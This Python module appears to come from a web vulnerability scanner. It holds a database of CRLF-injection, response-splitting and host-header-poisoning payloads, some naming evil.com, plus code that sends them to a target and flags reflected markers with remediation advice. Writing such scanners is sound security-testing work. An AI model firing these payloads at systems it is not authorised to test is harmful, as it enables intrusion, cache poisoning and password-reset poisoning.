"""
GrotAssault — CRLF / Header injection payloads.

Tests for CRLF injection (\\r\\n), HTTP response splitting,
and host header poisoning attacks.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Any, List, Optional

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.grotassault.crlf")


# ------------------------------------------------------------------
# Payload database
# ------------------------------------------------------------------

@dataclass
class CrlfPayload(HttpClientMixin):
    """A single CRLF / header injection payload."""
    label: str
    value: str
    location: str  # header, body, query
    category: str  # crlf, response_split, host_header


# CRLF injection payloads — injected into header values
CRLF_HEADER_PAYLOADS: List[CrlfPayload] = [
    CrlfPayload("basic CRLF", "injected\r\nX-Injected: true", "header", "crlf"),
    CrlfPayload("URL-encoded CRLF", "injected%0d%0aX-Injected:%20true", "header", "crlf"),
    CrlfPayload("double-encoded CRLF", "injected%250d%250aX-Injected:%20true", "header", "crlf"),
    CrlfPayload("LF only", "injected\nX-Injected: true", "header", "crlf"),
    CrlfPayload("CR only", "injected\rX-Injected: true", "header", "crlf"),
    CrlfPayload("Unicode CRLF (U+000D)", "injected\u000d\u000aX-Injected: true", "header", "crlf"),
    CrlfPayload("null+CRLF", "injected\x00\r\nX-Injected: true", "header", "crlf"),
]

# Response splitting — inject a full HTTP response
RESPONSE_SPLIT_PAYLOADS: List[CrlfPayload] = [
    CrlfPayload(
        "response split body",
        "test\r\n\r\n<html>injected</html>",
        "header", "response_split",
    ),
    CrlfPayload(
        "response split header+body",
        "test\r\nContent-Type: text/html\r\n\r\n<html>injected</html>",
        "header", "response_split",
    ),
    CrlfPayload(
        "URL-encoded split",
        "test%0d%0a%0d%0a<html>injected</html>",
        "header", "response_split",
    ),
]

# Host header poisoning payloads
HOST_HEADER_PAYLOADS: List[CrlfPayload] = [
    CrlfPayload("evil host", "evil.com", "header", "host_header"),
    CrlfPayload("host with port", "evil.com:443", "header", "host_header"),
    CrlfPayload("X-Forwarded-Host", "evil.com", "header", "host_header"),
    CrlfPayload("double host CRLF", "legit.com\r\nHost: evil.com", "header", "host_header"),
    CrlfPayload("@-trick", "legit.com@evil.com", "header", "host_header"),
]

# Query-string CRLF injections
QS_CRLF_PAYLOADS: List[CrlfPayload] = [
    CrlfPayload("qs CRLF", "value%0d%0aInjected:%20true", "query", "crlf"),
    CrlfPayload("qs response split", "value%0d%0a%0d%0a<injected/>", "query", "response_split"),
]

ALL_CRLF_PAYLOADS: List[CrlfPayload] = (
    CRLF_HEADER_PAYLOADS
    + RESPONSE_SPLIT_PAYLOADS
    + HOST_HEADER_PAYLOADS
    + QS_CRLF_PAYLOADS
)


# ------------------------------------------------------------------
# Detection patterns
# ------------------------------------------------------------------

_REFLECTION_MARKERS = [
    "x-injected: true",
    "x-injected:true",
    "<html>injected</html>",
    "<injected/>",
]


# ------------------------------------------------------------------
# Checker class
# ------------------------------------------------------------------

class CrlfChecker(HttpClientMixin):
    """
    Test endpoints for CRLF injection and HTTP response splitting.
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None

    async def check(self, target: Target) -> List[Finding]:
        """Run all CRLF / response-splitting checks on *target*."""
        findings: List[Finding] = []

        findings.extend(await self._test_header_injection(target))
        findings.extend(await self._test_host_header(target))
        findings.extend(await self._test_query_injection(target))

        return findings

    @staticmethod
    def get_payloads(category: Optional[str] = None) -> List[CrlfPayload]:
        if category:
            return [p for p in ALL_CRLF_PAYLOADS if p.category == category]
        return list(ALL_CRLF_PAYLOADS)

    # ------------------------------------------------------------------
    # Header value injection
    # ------------------------------------------------------------------

    async def _test_header_injection(self, target: Target) -> List[Finding]:
        findings: List[Finding] = []
        client = self._get_client()

        try:
            payloads = CRLF_HEADER_PAYLOADS + RESPONSE_SPLIT_PAYLOADS
            for payload in payloads:
                # Inject into a custom header
                headers = dict(target.headers or {})
                headers["X-Custom-Input"] = payload.value
                try:
                    resp = await client.request(
                        target.method, target.url, headers=headers,
                    )
                    if self._detect_reflection(resp):
                        sev = Severity.HIGH if payload.category == "response_split" else Severity.MEDIUM
                        findings.append(Finding(
                            title=f"CRLF injection via header ({payload.label})",
                            description=(
                                f"Injecting CRLF characters into request headers causes "
                                f"header injection in the response at {target.url}."
                            ),
                            severity=sev,
                            target=target,
                            evidence=f"Payload: {payload.label}, category: {payload.category}",
                            remediation="Strip or reject CR/LF characters in all header values.",
                            cwe=113,
                            tags=["crlf", "header-injection", payload.category],
                        ))
                except Exception as exc:
                    logger.debug("Error testing CRLF payload '%s': %s", payload.label, exc)
        finally:
            self._maybe_close(client)

        return findings

    # ------------------------------------------------------------------
    # Host header poisoning
    # ------------------------------------------------------------------

    async def _test_host_header(self, target: Target) -> List[Finding]:
        findings: List[Finding] = []
        client = self._get_client()

        try:
            # Baseline
            baseline = await client.request(target.method, target.url)
            baseline_text = (getattr(baseline, "text", "") or "").lower()

            for payload in HOST_HEADER_PAYLOADS:
                headers = dict(target.headers or {})

                if payload.label == "X-Forwarded-Host":
                    headers["X-Forwarded-Host"] = payload.value
                else:
                    headers["Host"] = payload.value

                try:
                    resp = await client.request(
                        target.method, target.url, headers=headers,
                    )
                    resp_text = (getattr(resp, "text", "") or "").lower()

                    # Check if evil.com appears in the response body
                    if "evil.com" in resp_text and "evil.com" not in baseline_text:
                        findings.append(Finding(
                            title=f"Host header poisoning ({payload.label})",
                            description=(
                                f"The application reflects a manipulated Host header in "
                                f"its response at {target.url}. This can be leveraged for "
                                f"password-reset poisoning, cache poisoning, or SSRF."
                            ),
                            severity=Severity.MEDIUM,
                            target=target,
                            evidence=f"Injected: {payload.value}, reflected in body",
                            remediation="Validate the Host header against a whitelist. Ignore X-Forwarded-Host from untrusted sources.",
                            cwe=644,
                            tags=["host-header", "poisoning", "crlf"],
                        ))
                except Exception as exc:
                    logger.debug("Error testing host header '%s': %s", payload.label, exc)
        finally:
            self._maybe_close(client)

        return findings

    # ------------------------------------------------------------------
    # Query-string injection
    # ------------------------------------------------------------------

    async def _test_query_injection(self, target: Target) -> List[Finding]:
        findings: List[Finding] = []
        client = self._get_client()

        try:
            for payload in QS_CRLF_PAYLOADS:
                sep = "&" if "?" in target.url else "?"
                url = f"{target.url}{sep}param={payload.value}"

                try:
                    resp = await client.request(target.method, url)
                    if self._detect_reflection(resp):
                        findings.append(Finding(
                            title=f"CRLF injection via query string ({payload.label})",
                            description=f"CRLF in query parameter reflected in response at {target.url}.",
                            severity=Severity.MEDIUM,
                            target=target,
                            evidence=f"Payload: {payload.value}",
                            remediation="URL-decode and strip CR/LF from query parameters before reflecting.",
                            cwe=113,
                            tags=["crlf", "query-injection", payload.category],
                        ))
                except Exception as exc:
                    logger.debug("Error testing QS CRLF '%s': %s", payload.label, exc)
        finally:
            self._maybe_close(client)

        return findings

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _detect_reflection(resp: Any) -> bool:
        """Check if response contains evidence of injected headers/content."""
        text = (getattr(resp, "text", "") or "").lower()
        headers_raw = ""
        resp_headers = getattr(resp, "headers", {})
        if isinstance(resp_headers, dict):
            headers_raw = " ".join(f"{k}: {v}" for k, v in resp_headers.items()).lower()

        combined = text + " " + headers_raw
        return any(marker in combined for marker in _REFLECTION_MARKERS)

    def _get_client(self) -> HttpClient:
        if self._client:
            return self._client
        return HttpClient(timeout=10.0, retries=0)

    def _maybe_close(self, client: HttpClient) -> None:
        pass
